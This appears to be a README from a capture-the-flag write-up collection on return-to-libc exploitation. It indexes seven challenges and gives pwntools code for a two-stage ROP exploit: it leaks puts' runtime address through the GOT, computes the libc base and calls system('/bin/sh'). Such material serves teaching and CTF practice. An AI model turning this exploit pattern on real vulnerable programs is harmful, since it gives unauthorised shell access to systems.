# Return to libc

Challenges where NX is enabled (no shellcode) and no `win()` function exists in the binary. The goal is to call `system("/bin/sh")` by redirecting execution into the C standard library. Because ASLR randomizes libc's base address on every run, most challenges require a **two-stage approach**: leak a runtime libc address first, compute the base, then send the final ROP chain.

## Challenges

| challenge | technique | leak primitive |
|---|---|---|
| [neon-dinner](neon-dinner/) | ret2plt | No leak needed — `system()` is already in the PLT and `/bin/sh` is embedded in the binary |
| [dusty-scrolls](dusty-scrolls/) | 2-stage ret2libc | `puts(puts@GOT)` prints the runtime address of puts → compute libc base |
| [digital-postcard-writer](digital-postcard-writer/) | 2-stage ret2libc | Same two-stage puts@GOT leak pattern, 136-byte offset, Ubuntu 24.04 libc provided |
| [crystal-ball](crystal-ball/) | 2-stage ret2libc | `gets()` overflow; gifted `pop_rdi_ret` symbol; `puts(puts@GOT)` leak, return to main for stage 2 |
| [feedback-portal](feedback-portal/) | format string + BOF | `%15$s` dereferences a stack-resident GOT address → libc base; BOF delivers the ROP chain |
| [aquabank-atm](aquabank-atm/) | format string + BOF | `%1$p` leaks `_IO_2_1_stdout_+131` → subtract known offset to get libc base |
| [aquabank-vault](aquabank-vault/) | OOB read + BOF + canary | `fwrite(buf,1,256)` reads past the 64-byte buffer, exposing the canary and a libc pointer |

## Two-Stage Exploit Pattern

**Stage 1 — leak puts' runtime address:**
```python
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(POP_RDI),
    p64(exe.got['puts']),   # rdi = &puts (GOT slot)
    p64(exe.plt['puts']),   # call puts(rdi) → prints 8-byte libc address
    p64(exe.sym['main']),   # return to main for stage 2
)
```

**Parse the leak and resolve libc base:**
```python
leak = r.recvline().strip().ljust(8, b'\x00')
puts_addr    = u64(leak)
libc.address = puts_addr - libc.sym['puts']
```

**Stage 2 — call system("/bin/sh"):**
```python
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET),                                    # stack alignment
    p64(POP_RDI),
    p64(next(libc.search(b'/bin/sh\x00'))),      # rdi = "/bin/sh"
    p64(libc.sym['system']),
)
```

## Key Concepts

**PLT vs GOT:** `puts@PLT` is executable code that resolves and jumps through `puts@GOT`. `puts@GOT` is a data slot holding the runtime address. Calling `puts@PLT` with `rdi = puts@GOT` causes puts to print its own runtime address — the canonical ret2plt leak.

**`ljust(8, b'\x00')`:** puts stops printing at the first null byte. High-address bytes of a 48-bit pointer are null, so the received line may be shorter than 8 bytes. Left-justifying and zero-padding before `u64()` is mandatory to avoid a corrupted leak.

**Stack alignment:** `system()` uses SSE instructions that require RSP to be 16-byte aligned at the `call`. A bare `ret` gadget before the chain fixes misalignment.

**Provided libc:** always work against the libc shipped with the challenge (`./libc.so.6`), not the local system libc. Symbol offsets differ between versions.
